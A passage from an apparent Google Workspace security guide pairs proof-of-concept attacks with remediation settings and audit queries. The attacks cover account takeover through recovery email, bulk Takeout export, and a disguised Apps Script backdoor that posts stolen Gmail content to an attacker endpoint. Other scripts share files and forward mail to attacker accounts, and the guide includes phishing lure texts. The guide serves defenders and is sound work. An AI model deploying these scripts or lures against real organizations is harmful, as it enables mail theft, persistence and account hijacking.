<li> <p>Application Allowlisting: <pre><code>Implement domain-wide application allowlisting in Admin Console:\nAdmin Console &gt; Security &gt; API Controls &gt; Domain-wide OAuth API Access Control\nSet policy to: \"Only allow user access to specific third-party applications\"\n</code></pre></p> </li> <li> <p>API Access Management Implementation: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App Access Control\nEnable \"Control which third-party apps can access Google Services\"\nSet to \"Only allow access to trusted apps\"\n</code></pre></p> </li> <li> <p>OAuth Token Monitoring: Create alerts for suspicious token activities: <pre><code>-- Sample monitoring query\nSELECT user_email, application_name, scope_list, \n       request_time, client_id\nFROM token_audit_logs\nWHERE application_name NOT IN (SELECT app_name FROM approved_applications)\n  AND (\n    scope_list LIKE '%gmail%' OR\n    scope_list LIKE '%drive%' OR\n    scope_list LIKE '%admin%'\n  )\nORDER BY request_time DESC\n</code></pre></p> </li> <li> <p>User Education Campaign:</p> </li> <li>Train users on OAuth authorization risks</li> <li>Implement simulated OAuth phishing exercises</li> <li>Create clear procedures for reporting suspicious application requests</li> </ol>"},{"location":"exploitation-examples/#2-google-workspace-authentication-bypass","title":"2. Google Workspace Authentication Bypass","text":""},{"location":"exploitation-examples/#vulnerability-recovery-email-manipulation","title":"Vulnerability: Recovery Email Manipulation","text":"<p>Description: Attackers can potentially hijack accounts by manipulating account recovery options, especially in organizations without strict recovery controls.</p>"},{"location":"exploitation-examples/#proof-of-concept-exploitation_1","title":"Proof-of-Concept Exploitation:","text":"<p>1. Reconnaissance Phase:</p> <pre><code># Using OSINT to gather employee information\n# Example tools: LinkedIn, hunter.io, social media\n\n# Example of information gathering script\n#!/bin/bash\n# Simple script to gather email formats from a company\nCOMPANY=\"targetcompany\"\nDOMAIN=\"targetcompany.com\"\n\n# Gather email addresses from public sources\necho \"Gathering public email addresses for $DOMAIN...\"\ncurl -s \"https://api.hunter.io/v2/domain-search?domain=$DOMAIN&amp;api_key=YOUR_API_KEY\" | jq\n\n# Extract email pattern\necho \"Analyzing email patterns...\"\n# [Analysis logic to determine email format like firstname.lastname@domain.com]\n\n# Output potential recovery emails based on format\necho \"Generating potential recovery emails...\"\n# [Generate list of possible personal recovery emails]\n</code></pre> <p>2. Targeted Spear-Phishing:</p> <p>The attacker crafts a convincing email that appears to come from IT support:</p> <pre><code>Subject: Urgent: Security Verification Required\n\nDear [Employee Name],\n\nOur security system has detected unusual access to your account.\nTo verify your identity, please confirm your account recovery email.\n\n[Verify Account]\n\nIf you don't complete this verification within 24 hours, your account may be suspended.\n\nIT Security Team\n</code></pre> <p>The link leads to a fake Google login page that specifically asks for recovery email information.</p> <p>3. Account Takeover via Recovery:</p> <p>Once the attacker knows the recovery email, they can attempt account takeover:</p> <ol> <li>Navigate to Google account login</li> <li>Click \"Forgot Password\"</li> <li>Enter target's email address</li> <li>Select \"Send recovery code to recovery email\"</li> <li>Attacker, who now controls the recovery email, receives the code</li> <li>Reset password and gain access to the account</li> </ol>"},{"location":"exploitation-examples/#remediation-strategies_1","title":"Remediation Strategies:","text":"<ol> <li> <p>Enforce Strong Recovery Controls: <pre><code>Admin Console &gt; Security &gt; Authentication &gt; Recovery options\nSet \"Allow users to view and update recovery info\" to \"Only allow for specific organizational units\"\nDisable \"Allow users to view and update their recovery email\"\n</code></pre></p> </li> <li> <p>Implement Advanced Recovery Verification: <pre><code>Admin Console &gt; Security &gt; Authentication &gt; 2-Step Verification\nMake 2-Step Verification mandatory for all users\nConfigure \"Require verification for recovery actions\"\n</code></pre></p> </li> <li> <p>Recovery Event Monitoring: <pre><code>-- Sample monitoring query for recovery changes\nSELECT user_email, event_type, ip_address, user_agent, timestamp\nFROM admin_audit_logs\nWHERE event_type IN ('CHANGE_RECOVERY_EMAIL', 'CHANGE_RECOVERY_PHONE')\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Security Key Enforcement:</p> </li> <li>Require security keys for account recovery operations</li> <li>Implement hardware key attestation</li> <li>Configure advanced protection program for critical users</li> </ol>"},{"location":"exploitation-examples/#3-google-workspace-data-exfiltration","title":"3. Google Workspace Data Exfiltration","text":""},{"location":"exploitation-examples/#vulnerability-google-takeout-service-abuse","title":"Vulnerability: Google Takeout Service Abuse","text":"<p>Description: The Google Takeout service allows users to export their entire data across Google services, which can be abused to exfiltrate large amounts of company data without generating typical DLP alerts.</p>"},{"location":"exploitation-examples/#proof-of-concept-exploitation_2","title":"Proof-of-Concept Exploitation:","text":"<p>1. Initiating Takeout Data Export:</p> <p>An attacker with access to a compromised account can navigate to Google Takeout (takeout.google.com) and:</p> <ol> <li>Select all Google services containing sensitive data:</li> <li>Gmail</li> <li>Drive</li> <li>Calendar</li> <li>Contacts</li> <li> <p>etc.</p> </li> <li> <p>Configure export options for maximum data:</p> </li> <li>Select all data categories</li> <li>Choose largest export size</li> <li>Select one-time download option</li> <li> <p>Use .zip format (less scrutiny than .tgz)</p> </li> <li> <p>Create the export, which generates minimal logs compared to individual downloads</p> </li> </ol> <p>2. Scripted Data Extraction:</p> <pre><code># Python script for automating Takeout extraction\n# Requires authenticated Google session (cookies)\n\nimport requests\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nimport time\nimport json\n\n# Setup headless browser\noptions = Options()\noptions.add_argument(\"--headless\")\noptions.add_argument(\"--user-data-dir=/path/to/profile\")  # Pre-authenticated profile\ndriver = webdriver.Chrome(options=options)\n\n# Navigate to Takeout\ndriver.get(\"https://takeout.google.com/\")\ntime.sleep(2)\n\n# Select all services\nselect_all_button = driver.find_element_by_xpath(\"//button[contains(text(), 'Select all')]\")\nselect_all_button.click()\ntime.sleep(1)\n\n# Configure export\nnext_button = driver.find_element_by_xpath(\"//button[contains(text(), 'Next step')]\")\nnext_button.click()\ntime.sleep(1)\n\n# Select maximum size, one-time download\n# [Configure export options code]\n\n# Create export\ncreate_export_button = driver.find_element_by_xpath(\"//button[contains(text(), 'Create export')]\")\ncreate_export_button.click()\n\n# Wait for export to complete\n# [Monitoring code]\n\n# Download export when ready\n# [Download code]\n\nprint(\"Data export complete\")\n</code></pre> <p>3. Low-Profile Exfiltration:</p> <p>The attacker can then download the exported data archive and exfiltrate it through various methods:</p> <ul> <li>Direct download (less suspicious than multiple individual file downloads)</li> <li>Transfer to personal Google Drive account</li> <li>Upload to external storage service</li> <li>Split and extract through multiple channels</li> </ul>"},{"location":"exploitation-examples/#remediation-strategies_2","title":"Remediation Strategies:","text":"<ol> <li> <p>Restrict Takeout Access: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Settings for Data Access\nUnder \"Data access and data management controls\"\nRestrict Google Takeout Usage to specific OUs\n</code></pre></p> </li> <li> <p>Implement Takeout Monitoring: <pre><code>-- Sample monitoring query for Takeout activity\nSELECT user_email, application, event_type, ip_address, timestamp\nFROM admin_audit_logs\nWHERE application = 'Takeout' \n  AND event_type IN ('EXPORT_INITIATED', 'EXPORT_DOWNLOADED')\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Create Data Export Alerts:</p> </li> <li>Generate alerts when users initiate Takeout exports</li> <li>Monitor for downloaded export sizes exceeding thresholds</li> <li> <p>Implement approval workflows for data exports</p> </li> <li> <p>DLP Integration:</p> </li> <li>Deploy Google DLP controls across services</li> <li>Implement content-based restrictions on exports</li> <li>Configure alerts for bulk sensitive data movement</li> </ol>"},{"location":"exploitation-examples/#4-google-workspace-persistence-mechanisms","title":"4. Google Workspace Persistence Mechanisms","text":""},{"location":"exploitation-examples/#vulnerability-google-apps-script-backdoors","title":"Vulnerability: Google Apps Script Backdoors","text":"<p>Description: Google Apps Script can be used to create persistent backdoors in Google Workspace environments, allowing attackers to maintain access even after credentials are changed.</p>"},{"location":"exploitation-examples/#proof-of-concept-exploitation_3","title":"Proof-of-Concept Exploitation:","text":"<p>1. Creating a Backdoor Script:</p> <p>Navigate to script.google.com and create a new project with the following code:</p> <pre><code>// Malicious Google Apps Script for persistence\n// Appears as a harmless utility script\n\n// Innocent-looking function that users might legitimately use\nfunction generateReportTemplate() {\n  const doc = DocumentApp.create('Report Template');\n  doc.getBody().appendParagraph('This is a report template');\n  return doc.getUrl();\n}\n\n// Backdoor function that forwards emails\nfunction setupMailHandling() {\n  // Create time-driven trigger to run every hour\n  ScriptApp.newTrigger('processEmails')\n           .timeBased()\n           .everyHours(1)\n           .create();\n  return \"Mail handling configured successfully\";\n}\n\n// The actual malicious function\nfunction processEmails() {\n  // Get recent emails\n  const threads = GmailApp.search('newer_than:1h');\n  let emailContent = \"\";\n  \n  // Extract email content\n  for (let i = 0; i &lt; threads.length; i++) {\n    const messages = threads[i].getMessages();\n    for (let j = 0; j &lt; messages.length; j++) {\n      const message = messages[j];\n      emailContent += \"From: \" + message.getFrom() + \"\\n\";\n      emailContent += \"Subject: \" + message.getSubject() + \"\\n\";\n      emailContent += \"Body: \" + message.getPlainBody() + \"\\n\\n\";\n    }\n  }\n  \n  // Exfiltrate data if there are any emails\n  if (emailContent) {\n    exfiltrateData(emailContent);\n  }\n}\n\n// Function to exfiltrate data\nfunction exfiltrateData(data) {\n  // Option 1: Send to external webhook\n  const payload = {\n    'data': Utilities.base64Encode(data)\n  };\n  \n  UrlFetchApp.fetch('https://attacker-controlled-endpoint.com/collect', {\n    'method': 'post',\n    'contentType': 'application/json',\n    'payload': JSON.stringify(payload)\n  });\n  \n  // Option 2: Store in attacker-controlled spreadsheet\n  // This could be a shared spreadsheet owned by an outside collaborator\n  const spreadsheetId = '1aBcDeFgHiJkLmNoPqRsTuVwXyZ';\n  const sheet = SpreadsheetApp.openById(spreadsheetId).getSheets()[0];\n  sheet.appendRow([new Date(), data]);\n}\n\n// Decoy function for users who discover the script\nfunction help() {\n  return \"This utility script helps generate report templates for the team. Use generateReportTemplate() to create a new template.\";\n}\n</code></pre> <p>2. Deploying the Backdoor:</p> <ol> <li>Deploy the script as a web app:</li> <li>Select \"Deploy as web app\"</li> <li>Execute as: \"User accessing the web app\"</li> <li> <p>Who has access: \"Anyone within [organization]\"</p> </li> <li> <p>Share the script with a legitimate pretext:    <pre><code>Subject: New Report Template Generator\n\nHi Team,\n\nI've created a simple tool to generate consistent report templates.\nClick below to access it, then click \"Authorize\" when prompted.\n\n[Access Report Generator]\n\nIt will save us time by creating standardized templates.\n\nThanks,\n[Name]\n</code></pre></p> </li> <li> <p>Once authorized, the script runs with the user's permissions and establishes persistence through time-based triggers</p> </li> </ol> <p>3. Maintaining Access:</p> <p>The script maintains access by: - Running on a timer, independent of user actions - Exfiltrating data to external endpoints or attacker-controlled sheets - Surviving password changes or MFA updates - Appearing legitimate to casual inspection</p>"},{"location":"exploitation-examples/#remediation-strategies_3","title":"Remediation Strategies:","text":"<ol> <li> <p>Script Visibility and Controls: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Apps Script\nSet \"Google Cloud Platform (GCP) trust\" to \"Block all API access\"\nEnable \"Apps Script API methods\" restriction\nConfigure \"External user access\" restrictions\n</code></pre></p> </li> <li> <p>Implement Script Monitoring: <pre><code>-- Sample monitoring query for Apps Script activities\nSELECT user_email, event_name, method_name, script_id, timestamp\nFROM apps_script_logs\nWHERE event_name IN ('createTrigger', 'updateTrigger', 'doPost', 'urlFetch') \n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Trigger Inventory and Review:</p> </li> <li>Regularly audit all time-based and event-driven triggers</li> <li>Review script permissions and authorizations</li> <li> <p>Implement mandatory code review for scripts in production</p> </li> <li> <p>Network Controls:</p> </li> <li>Restrict script URL fetch destinations</li> <li>Monitor for data exfiltration patterns</li> <li>Implement domain restrictions for Apps Script</li> </ol>"},{"location":"exploitation-examples/#5-exploiting-organizational-unit-misconfiguration","title":"5. Exploiting Organizational Unit Misconfiguration","text":""},{"location":"exploitation-examples/#vulnerability-ou-privilege-escalation","title":"Vulnerability: OU Privilege Escalation","text":"<p>Description: Improperly configured organizational units can lead to privilege escalation opportunities where users can move between OUs or access resources intended for higher privilege groups.</p>"},{"location":"exploitation-examples/#proof-of-concept-exploitation_4","title":"Proof-of-Concept Exploitation:","text":"<p>1. Identifying OU Boundary Weaknesses:</p> <pre><code># Python script to map OU structure and identify inheritance issues\n# Requires Admin SDK API access\n\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\n\n# Setup credentials and API client\ncreds = ServiceAccountCredentials.from_json_keyfile_name(\n    'service-account.json',\n    ['https://www.googleapis.com/auth/admin.directory.orgunit']\n)\ncreds = creds.create_delegated('admin@domain.com')\nservice = build('admin', 'directory_v1', credentials=creds)\n\ndef map_ou_structure(parent_path='/', parent_settings=None):\n    \"\"\"Recursively map OU structure and identify inheritance issues\"\"\"\n    results = service.orgunits().list(customerId='my_customer', \n                                       orgUnitPath=parent_path, \n                                       type='all').execute()\n    \n    all_units = {}\n    if 'organizationUnits' in results:\n        for unit in results['organizationUnits']:\n            print(f\"Analyzing OU: {unit['name']} (Path: {unit['orgUnitPath']})\")\n            \n            # Get settings for this OU\n            settings = get_ou_settings(unit['orgUnitPath'])\n            \n            # Check for inheritance issues\n            if parent_settings:\n                inheritance_issues = check_inheritance_issues(parent_settings, settings)\n                if inheritance_issues:\n                    print(f\"  WARNING: Inheritance issues detected in {unit['name']}:\")\n                    for issue in inheritance_issues:\n                        print(f\"    - {issue}\")\n            \n            # Recursively map child OUs\n            children = map_ou_structure(unit['orgUnitPath'], settings)\n            \n            all_units[unit['orgUnitPath']] = {\n                'name': unit['name'],\n                'settings': settings,\n                'children': children\n            }\n    \n    return all_units\n\ndef get_ou_settings(ou_path):\n    \"\"\"Get settings for a specific OU\"\"\"\n    # This would normally call the appropriate APIs to get various settings\n    # For this example, we'll just return dummy data\n    return {\n        'services': ['gmail', 'drive', 'calendar'],\n        'security': {\n            'mfa_required': ou_path == '/' or 'executives' in ou_path,\n            'data_export_restricted': 'executives' in ou_path or 'finance' in ou_path,\n            'mobile_management': 'executives' in ou_path\n        }\n    }\n\ndef check_inheritance_issues(parent, child):\n    \"\"\"Check for security inheritance issues between parent and child OUs\"\"\"\n    issues = []\n    \n    # Check for security settings that should be inherited but aren't\n    if parent['security']['mfa_required'] and not child['security']['mfa_required']:\n        issues.append(\"MFA requirement not inherited from parent OU\")\n    \n    if parent['security']['data_export_restricted'] and not child['security']['data_export_restricted']:\n        issues.append(\"Data export restrictions not inherited from parent OU\")\n    \n    # Add other checks as needed\n    \n    return issues\n\n# Map the entire OU structure\nou_map = map_ou_structure()\nprint(\"OU mapping complete.\")\n</code></pre> <p>2. Exploiting Group Membership Controls:</p> <p>When an organization uses dynamic groups based on OUs but fails to properly restrict group membership controls:</p> <pre><code>// Example exploitation of group membership via Google Apps Script\n// Assumes attacker has basic user permissions but found a group with self-signup enabled\n\nfunction joinPrivilegedGroup() {\n  // Identify target group from directory\n  const groups = GroupsApp.getGroups();\n  let targetGroup = null;\n  \n  // Look for interesting groups with self-signup enabled\n  for (let i = 0; i &lt; groups.length; i++) {\n    const group = groups[i];\n    const groupName = group.getName();\n    \n    // Target high-value groups that might have improper controls\n    if (groupName.includes('admin') || \n        groupName.includes('finance') || \n        groupName.includes('hr') || \n        groupName.includes('executive')) {\n      \n      try {\n        // Attempt to join the group\n        group.addMember(Session.getActiveUser().getEmail());\n        console.log(`Successfully joined group: ${groupName}`);\n        targetGroup = group;\n        break;\n      } catch (e) {\n        console.log(`Failed to join group: ${groupName} - ${e.message}`);\n      }\n    }\n  }\n  \n  if (targetGroup) {\n    // If successful, notify the attacker\n    exfiltrateData(`Joined privileged group: ${targetGroup.getName()}`);\n  }\n}\n</code></pre> <p>3. Exploiting OU Boundary Crossing:</p> <p>When OUs have inconsistent drive sharing permissions:</p> <pre><code>// Exploit shared drive access inconsistencies between OUs\nfunction identifyDriveLeakagePaths() {\n  // Get all accessible shared drives\n  const drives = DriveApp.getSharedDrives();\n  let vulnerableDrives = [];\n  \n  for (let i = 0; i &lt; drives.length; i++) {\n    const drive = drives[i];\n    const files = drive.getFiles();\n    \n    while (files.hasNext()) {\n      const file = files.next();\n      // Look for sensitive content indicators\n      if (hasFinancialContent(file) || hasHRContent(file) || hasExecutiveContent(file)) {\n        vulnerableDrives.push({\n          driveName: drive.getName(),\n          driveId: drive.getId(),\n          fileName: file.getName(),\n          fileId: file.getId()\n        });\n        \n        // Share the file with external account\n        try {\n          file.addEditor('attacker-controlled-account@gmail.com');\n          console.log(`Successfully shared sensitive file: ${file.getName()}`);\n        } catch (e) {\n          console.log(`Failed to share file: ${file.getName()} - ${e.message}`);\n        }\n      }\n    }\n  }\n  \n  // Exfiltrate information about vulnerable drives\n  if (vulnerableDrives.length &gt; 0) {\n    exfiltrateData(JSON.stringify(vulnerableDrives));\n  }\n}\n\nfunction hasFinancialContent(file) {\n  // Check file metadata and content for financial indicators\n  try {\n    if (file.getMimeType() === 'application/vnd.google-apps.document') {\n      const content = DocumentApp.openById(file.getId()).getBody().getText().toLowerCase();\n      return content.includes('financial') || \n             content.includes('budget') || \n             content.includes('forecast') ||\n             content.includes('revenue');\n    }\n  } catch (e) {\n    // Error accessing content\n  }\n  return false;\n}\n\n// Similar functions for HR and executive content\n</code></pre>"},{"location":"exploitation-examples/#remediation-strategies_4","title":"Remediation Strategies:","text":"<ol> <li> <p>Implement OU Inheritance Protection: <pre><code>Admin Console &gt; Directory &gt; Organizational Units\nConfigure \"Override organizational inheritance\" permissions\nControl which admins can modify inheritance settings\nImplement change control for OU structure modifications\n</code></pre></p> </li> <li> <p>Group Membership Controls: <pre><code>Admin Console &gt; Directory &gt; Groups\nSet \"Who can join the group\" to \"Only invited users\"\nDisable \"Allow members to join themselves\" for all privileged groups\nConfigure \"Restrict posts\" to limit exposure\n</code></pre></p> </li> <li> <p>Regular OU Security Audits:</p> </li> <li>Create a comprehensive OU security baseline</li> <li>Regularly audit settings and inheritance across OUs</li> <li>Implement automated checks for security inconsistencies</li> <li> <p>Document intended security boundaries and validate implementation</p> </li> <li> <p>OU Change Monitoring: <pre><code>-- Sample monitoring query for OU changes\nSELECT admin_email, event_type, target_ou, affected_user_email, timestamp\nFROM admin_audit_logs\nWHERE event_type IN ('OU_MOVE', 'OU_SETTING_CHANGE', 'OU_CREATE')\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> </ol>"},{"location":"exploitation-examples/#6-gmail-filter-and-delegation-abuse","title":"6. Gmail Filter and Delegation Abuse","text":""},{"location":"exploitation-examples/#vulnerability-mail-delegation-and-filter-exploitation","title":"Vulnerability: Mail Delegation and Filter Exploitation","text":"<p>Description: Gmail delegation features and mail filters can be exploited to create persistence mechanisms and data exfiltration channels.</p>"},{"location":"exploitation-examples/#proof-of-concept-exploitation_5","title":"Proof-of-Concept Exploitation:","text":"<p>1. Mail Delegation Exploitation:</p> <p>When an organization allows Gmail delegation without proper controls:</p> <pre><code>// Google Apps Script to exploit mail delegation\nfunction setupMailDelegation() {\n  try {\n    // Attempt to grant delegation access\n    Gmail.Users.Settings.Delegates.create(\n      {\n        'delegateEmail': 'attacker@example.com',\n        'verificationStatus': 'accepted'\n      },\n      'me'\n    );\n    console.log('Delegation added successfully');\n    return true;\n  } catch (e) {\n    console.log('Failed to add delegation: ' + e.message);\n    return false;\n  }\n}\n</code></pre> <p>2. Covert Mail Filter Creation:</p> <pre><code>// Google Apps Script to create covert mail filter for BCC exfiltration\nfunction createCovertMailFilter() {\n  try {\n    // Create a filter that forwards specific emails\n    Gmail.Users.Settings.Filters.create({\n      'criteria': {\n        'from': '*', // All incoming mails\n        'subject': 'confidential' // Target sensitive emails\n      },\n      'action': {\n        'addLabelIds': ['INBOX'],\n        'forward': 'attacker-controlled@example.com'\n      }\n    }, 'me');\n    console.log('Mail filter created successfully');\n    return true;\n  } catch (e) {\n    console.log('Failed to create filter: ' + e.message);\n    return false;\n  }\n}\n</code></pre> <p>3. Exploitation via Gmail API:</p> <p>Using a compromised account to implement silent BCC forwarding:</p> <pre><code># Python script to implement silent BCC forwarding via Gmail API\nfrom googleapiclient.discovery import build\nfrom google.oauth2.credentials import Credentials\n\ndef setup_mail_exfiltration(credentials):\n    \"\"\"Set up silent exfiltration of emails via Gmail API\"\"\"\n    # Build the Gmail API service\n    service = build('gmail', 'v1', credentials=credentials)\n    \n    # Create a filter to forward specific emails\n    filter_content = {\n        'criteria': {\n            # Target sensitive content\n            'query': 'confidential OR secret OR password OR credentials OR financial OR salary'\n        },\n        'action': {\n            # Add labels to avoid suspicion\n            'addLabelIds': ['INBOX'],\n            # Forward to attacker-controlled address\n            'forward': 'attacker@exfil-domain.com'\n        }\n    }\n    \n    try:\n        # Create the filter\n        result = service.users().settings().filters().create(\n            userId='me',\n            body=filter_content\n        ).execute()\n        \n        print(f\"Filter created successfully with ID: {result['id']}\")\n        return result['id']\n    except Exception as e:\n        print(f\"Failed to create filter: {str(e)}\")\n        return None\n\ndef hide_filter_traces(credentials, filter_id):\n    \"\"\"Hide traces of the created filter to avoid detection\"\"\"\n    # For a real attack, this would try to modify logs or hide the filter\n    # This is a conceptual example and would not work in practice\n    pass\n</code></pre>"},{"location":"exploitation-examples/#remediation-strategies_5","title":"Remediation Strategies:","text":"<ol> <li> <p>Restrict Mail Delegation: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; User settings\nSet \"Email delegation\" to \"Disable setting for users\"\n</code></pre></p> </li> <li> <p>Control Mail Forwarding: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Routing\nConfigure \"Default routing\" settings\nSet \"Specify envelope recipient\" to \"Reject message\" to prevent external auto-forwarding\n</code></pre></p> </li> <li> <p>Mail Filter Monitoring: <pre><code>-- Sample monitoring query for mail filter creation\nSELECT user_email, event_type, filter_criteria, filter_action, timestamp\nFROM gmail_logs\nWHERE event_type = 'FILTER_CREATED'\n  AND (\n    filter_action LIKE '%forward%' OR \n    filter_action LIKE '%bcc%'\n  )\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nORDER BY timestamp DESC\n</code></pre></p> </li> <li> <p>Regular Mail Settings Audit:</p> </li> <li>Create automated inventory of mail delegation settings</li> <li>Regularly scan for unauthorized mail filters</li> <li>Implement approval workflow for mail forwarding</li> <li>Conduct targeted user education on mail security</li> </ol>"},{"location":"exploitation-examples/#security-implementation-checklist","title":"Security Implementation Checklist","text":"<p>Based on the exploitation examples, implement these critical security controls:</p>"},{"location":"exploitation-examples/#1-oauth-and-application-security","title":"1. OAuth and Application Security","text":"<ul> <li> Implement application allowlisting</li> <li> Restrict OAuth scope authorization</li> <li> Monitor token issuance and usage</li> <li> Implement regular third-party application reviews</li> </ul>"},{"location":"exploitation-examples/#2-account-security","title":"2. Account Security","text":"<ul> <li> Enforce MFA for all users and admins</li> <li> Restrict account recovery options</li> <li> Implement security keys for privileged accounts</li> <li> Control password reset and account recovery workflow</li> </ul>"},{"location":"exploitation-examples/#3-data-protection","title":"3. Data Protection","text":"<ul> <li> Restrict Google Takeout and data export capabilities</li> <li> Implement DLP across all Google services</li> <li> Control document sharing and access permissions</li> <li> Monitor bulk data access and export activities</li> </ul>"},{"location":"exploitation-examples/#4-persistent-access-controls","title":"4. Persistent Access Controls","text":"<ul> <li> Manage and monitor Google Apps Script creation and triggers</li> <li> Control mail delegation and forwarding capabilities</li> <li> Implement mail filter monitoring</li> <li> Conduct regular security reviews of automation components</li> </ul>"},{"location":"exploitation-examples/#5-environment-segmentation","title":"5. Environment Segmentation","text":"<ul> <li> Implement proper OU inheritance controls</li> <li> Secure group membership management</li> <li> Document and enforce security boundaries</li> <li> Conduct regular audits of security control inheritance</li> </ul>"},{"location":"exploitation-examples/#resources-for-security-testing","title":"Resources for Security Testing","text":"<ul> <li>Google Workspace Security Assessment Tool: https://support.google.com/a/answer/9198568</li> <li>Google Workspace Admin API Documentation: https://developers.google.com/admin-sdk</li> <li>OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/</li> <li>Gmail API Security Best Practices: https://developers.google.com/gmail/api/auth/security-best-practices</li> </ul> <p>Note: The examples in this document are provided solely for educational purposes to help security professionals understand attack vectors and implement appropriate defenses. All testing should be performed only in authorized environments with proper approvals.</p>"},{"location":"google-groups-security/","title":"Google Groups Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"google-groups-security/#google-groups-security-guide","title":"Google Groups Security Guide","text":"<p>This comprehensive guide provides security professionals and MSPs with detailed strategies for securing Google Groups, focusing on common attack vectors, security configuration, monitoring, and remediation.</p>"},{"location":"google-groups-security/#understanding-the-google-groups-security-landscape","title":"Understanding the Google Groups Security Landscape","text":""},{"location":"google-groups-security/#security-challenges-with-google-groups","title":"Security Challenges with Google Groups","text":"<p>Google Groups presents unique security challenges within Google Workspace:</p> <ol> <li>Access Control Complexity</li> <li>Group-based access to resources across Google services</li> <li>Complex permission inheritance and propagation</li> <li>Default configurations that may be overly permissive</li> <li> <p>Potential for unintended information disclosure</p> </li> <li> <p>Administration Challenges</p> </li> <li>Decentralized group management capabilities</li> <li>Self-service group creation and membership in many organizations</li> <li>Limited visibility into cross-group permission effects</li> <li> <p>Potential for shadow groups outside administrator control</p> </li> <li> <p>Attack Surface Considerations</p> </li> <li>Groups used as vectors for phishing campaigns</li> <li>Potential information disclosure through public group content</li> <li>Lateral movement opportunities through group membership</li> <li>Data exfiltration via group-shared resources</li> </ol>"},{"location":"google-groups-security/#common-security-misconfigurations","title":"Common Security Misconfigurations","text":"<p>Several common misconfigurations create security vulnerabilities:</p> Misconfiguration Description Security Impact Default Public Settings Groups created with overly permissive sharing settings Potential sensitive information exposure to unauthorized users Unauthenticated Access Groups configured to allow access without authentication Data exposure to external parties and search engines Unrestricted Group Creation All users allowed to create groups without oversight Proliferation of unmanaged groups with security risks Self-Service Membership Groups configured to allow users to join without approval Unauthorized access to shared resources and information Excessive External Sharing Groups with inappropriate external sharing capabilities Data leakage to external entities"},{"location":"google-groups-security/#attack-vectors-and-security-implications","title":"Attack Vectors and Security Implications","text":""},{"location":"google-groups-security/#google-groups-as-a-phishing-vector","title":"Google Groups as a Phishing Vector","text":"<p>Attackers leverage Google Groups for sophisticated phishing campaigns:</p> <ol> <li>Trust Exploitation</li> <li>Create groups with official-looking names</li> <li>Exploit the legitimate google.com domain</li> <li> <p>Leverage organization's branding in group settings</p> </li> <li> <p>Email Spoofing via Groups</p> </li> <li>Send emails that appear to come from legitimate Google Groups</li> <li>Bypass some anti-phishing controls through groups</li> <li> <p>Create convincing internal communications that contain malicious content</p> </li> <li> <p>Targeted Distribution</p> </li> <li>Add specific users to groups for targeted attacks</li> <li>Create groups for specific departments to increase relevance</li> <li>Use existing group information to craft context-aware attacks</li> </ol> <p>Sample Attack Scenario: <pre><code>1. Attacker creates \"IT-Security-Announcements\" group\n2. Configures group with organizational branding\n3. Adds target users to the group\n4. Sends \"urgent security update\" message with malicious link\n5. Exploits trust in internal Google Groups communications\n</code></pre></p>"},{"location":"google-groups-security/#reconnaissance-through-public-groups","title":"Reconnaissance Through Public Groups","text":"<p>Attackers mine public and improperly secured groups for intelligence:</p> <ol> <li>Sensitive Information Exposure</li> <li>Email addresses and organizational structure</li> <li>Internal communications and discussions</li> <li>Document links and shared resources</li> <li> <p>Project details and timelines</p> </li> <li> <p>Technical Information Leakage</p> </li> <li>System details and configurations</li> <li>Internal tool references</li> <li>Potential password or credential references</li> <li> <p>API keys or service information</p> </li> <li> <p>Social Engineering Intelligence</p> </li> <li>Employee names and roles</li> <li>Reporting structures and relationships</li> <li>Communication styles and patterns</li> <li>Company events and schedules</li> </ol>"},{"location":"google-groups-security/#group-based-privilege-escalation","title":"Group-Based Privilege Escalation","text":"<p>Attackers exploit Google Groups for privilege escalation:</p> <ol> <li>Self-Join Vulnerability</li> <li>Identify groups with self-service join capabilities</li> <li>Join groups with elevated access to resources</li> <li> <p>Exploit transitive permissions across groups</p> </li> <li> <p>Group Nesting Exploitation</p> </li> <li>Identify nested group relationships</li> <li>Target parent groups for broad access</li> <li> <p>Exploit complex nested permissions that may be overlooked</p> </li> <li> <p>Group-Based API Access</p> </li> <li>Identify groups with API or service access</li> <li>Target membership in service account groups</li> <li>Exploit group-based authorization for APIs</li> </ol>"},{"location":"google-groups-security/#secure-configuration-framework","title":"Secure Configuration Framework","text":""},{"location":"google-groups-security/#essential-security-controls","title":"Essential Security Controls","text":"<p>Implement these baseline controls for all Google Groups:</p> <ol> <li> <p>Group Creation Policies <pre><code>Admin Console &gt; Groups &gt; Groups Settings\n- Set \"Create groups\" to \"Only users in selected groups can create groups\"\n- Create dedicated group creator groups with appropriate members\n- Configure \"naming conventions\" for standardization\n</code></pre></p> </li> <li> <p>Default Access Settings <pre><code>Admin Console &gt; Groups &gt; Groups Settings &gt; Sharing settings\n- Configure \"Default Access Setting\" appropriately\n- Set \"External Access\" to \"Private\"\n- Configure \"Who can view conversations\" to \"Only members\"\n</code></pre></p> </li> <li> <p>Membership Controls <pre><code>Admin Console &gt; Groups &gt; Groups Settings\n- Set \"Join the group\" to \"Only invited users\"\n- Configure \"Allow members to invite others\" to \"Off\"\n- Set \"Allow members from outside your organization\" based on requirements\n</code></pre></p> </li> </ol>"},{"location":"google-groups-security/#group-type-specific-security-configuration","title":"Group Type-Specific Security Configuration","text":"<p>Different group types require specific security 